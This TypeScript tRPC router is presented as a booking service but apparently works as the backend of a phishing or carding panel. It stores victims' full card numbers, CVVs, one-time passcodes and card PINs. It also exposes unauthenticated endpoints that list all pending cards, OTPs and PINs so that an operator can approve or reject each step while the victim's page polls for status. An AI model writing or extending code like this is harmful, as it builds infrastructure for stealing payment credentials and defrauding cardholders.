import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";
import {
  saveBasicInfo,
  saveCardDetails,
  saveOtp,
  savePin,
  getPendingBasicInfo,
  getPendingCardDetails,
  getPendingOtp,
  getPendingPin,
  updateBasicInfoStatus,
  updateCardStatus,
  updateOtpStatus,
  updatePinStatus,
  getCardStatusByEmail,
  getOtpStatusByEmail,
  getPinStatusByEmail,
} from "./db";

export const bookingRouter = router({
  // Save basic booking information
  saveBasicInfo: publicProcedure
    .input(
      z.object({
        fullName: z.string(),
        email: z.string().email(),
        phone: z.string(),
        serviceType: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      try {
        await saveBasicInfo({
          fullName: input.fullName,
          email: input.email,
          phone: input.phone,
          serviceType: input.serviceType,
          status: "pending",
        });
        return { success: true };
      } catch (error) {
        console.error("Error saving basic info:", error);
        return { success: false, error: "Failed to save booking information" };
      }
    }),

  // Save card details
  saveCardDetails: publicProcedure
    .input(
      z.object({
        email: z.string().email(),
        cardNumber: z.string(),
        cardHolder: z.string(),
        expiryDate: z.string(),
        cvv: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      try {
        await saveCardDetails({
          email: input.email,
          cardNumber: input.cardNumber,
          cardHolder: input.cardHolder,
          expiryDate: input.expiryDate,
          cvv: input.cvv,
          status: "pending",
        });
        return { success: true };
      } catch (error) {
        console.error("Error saving card details:", error);
        return { success: false, error: "Failed to save card details" };
      }
    }),

  // Save OTP
  saveOtp: publicProcedure
    .input(
      z.object({
        email: z.string().email(),
        otp: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      try {
        await saveOtp({
          email: input.email,
          otp: input.otp,
          status: "pending",
        });
        return { success: true };
      } catch (error) {
        console.error("Error saving OTP:", error);
        return { success: false, error: "Failed to save OTP" };
      }
    }),

  // Save PIN
  savePin: publicProcedure
    .input(
      z.object({
        email: z.string().email(),
        pin: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      try {
        await savePin({
          email: input.email,
          pin: input.pin,
          status: "pending",
        });
        return { success: true };
      } catch (error) {
        console.error("Error saving PIN:", error);
        return { success: false, error: "Failed to save PIN" };
      }
    }),

  // Check card status
  checkCardStatus: publicProcedure
    .input(z.object({ email: z.string().email() }))
    .query(async ({ input }) => {
      try {
        const status = await getCardStatusByEmail(input.email);
        return { success: true, data: status };
      } catch (error) {
        console.error("Error checking card status:", error);
        return { success: false, data: null, error: "Failed to check card status" };
      }
    }),

  // Check OTP status
  checkOtpStatus: publicProcedure
    .input(z.object({ email: z.string().email() }))
    .query(async ({ input }) => {
      try {
        const status = await getOtpStatusByEmail(input.email);
        return { success: true, data: status };
      } catch (error) {
        console.error("Error checking OTP status:", error);
        return { success: false, data: null, error: "Failed to check OTP status" };
      }
    }),

  // Check PIN status
  checkPinStatus: publicProcedure
    .input(z.object({ email: z.string().email() }))
    .query(async ({ input }) => {
      try {
        const status = await getPinStatusByEmail(input.email);
        return { success: true, data: status };
      } catch (error) {
        console.error("Error checking PIN status:", error);
        return { success: false, data: null, error: "Failed to check PIN status" };
      }
    }),

  // Get pending basic info
  getPendingBasicInfo: publicProcedure.query(async () => {
    try {
      const basicInfo = await getPendingBasicInfo();
      return { success: true, data: basicInfo };
    } catch (error) {
      console.error("Error getting pending basic info:", error);
      return { success: false, data: [], error: "Failed to fetch pending basic info" };
    }
  }),

  // Get pending card details
  getPendingCardDetails: publicProcedure.query(async () => {
    try {
      const cards = await getPendingCardDetails();
      return { success: true, data: cards };
    } catch (error) {
      console.error("Error getting pending cards:", error);
      return { success: false, data: [], error: "Failed to fetch pending cards" };
    }
  }),

  // Get pending OTP
  getPendingOtp: publicProcedure.query(async () => {
    try {
      const otps = await getPendingOtp();
      return { success: true, data: otps };
    } catch (error) {
      console.error("Error getting pending OTPs:", error);
      return { success: false, data: [], error: "Failed to fetch pending OTPs" };
    }
  }),

  // Get pending PIN
  getPendingPin: publicProcedure.query(async () => {
    try {
      const pins = await getPendingPin();
      return { success: true, data: pins };
    } catch (error) {
      console.error("Error getting pending PINs:", error);
      return { success: false, data: [], error: "Failed to fetch pending PINs" };
    }
  }),

  // Update basic info status
  updateBasicInfoStatus: publicProcedure
    .input(
      z.object({
        id: z.number(),
        status: z.enum(["pending", "approved", "rejected"]),
      })
    )
    .mutation(async ({ input }) => {
      try {
        await updateBasicInfoStatus(input.id, input.status);
        return { success: true };
      } catch (error) {
        console.error("Error updating basic info status:", error);
        return { success: false, error: "Failed to update basic info status" };
      }
    }),

  // Update card status
  updateCardStatus: publicProcedure
    .input(
      z.object({
        id: z.number(),
        status: z.enum(["pending", "approved", "rejected"]),
      })
    )
    .mutation(async ({ input }) => {
      try {
        await updateCardStatus(input.id, input.status);
        return { success: true };
      } catch (error) {
        console.error("Error updating card status:", error);
        return { success: false, error: "Failed to update card status" };
      }
    }),

  // Update OTP status
  updateOtpStatus: publicProcedure
    .input(
      z.object({
        id: z.number(),
        status: z.enum(["pending", "approved", "rejected"]),
      })
    )
    .mutation(async ({ input }) => {
      try {
        await updateOtpStatus(input.id, input.status);
        return { success: true };
      } catch (error) {
        console.error("Error updating OTP status:", error);
        return { success: false, error: "Failed to update OTP status" };
      }
    }),

  // Update PIN status
  updatePinStatus: publicProcedure
    .input(
      z.object({
        id: z.number(),
        status: z.enum(["pending", "approved", "rejected"]),
      })
    )
    .mutation(async ({ input }) => {
      try {
        await updatePinStatus(input.id, input.status);
        return { success: true };
      } catch (error) {
        console.error("Error updating PIN status:", error);
        return { success: false, error: "Failed to update PIN status" };
      }
    }),
});
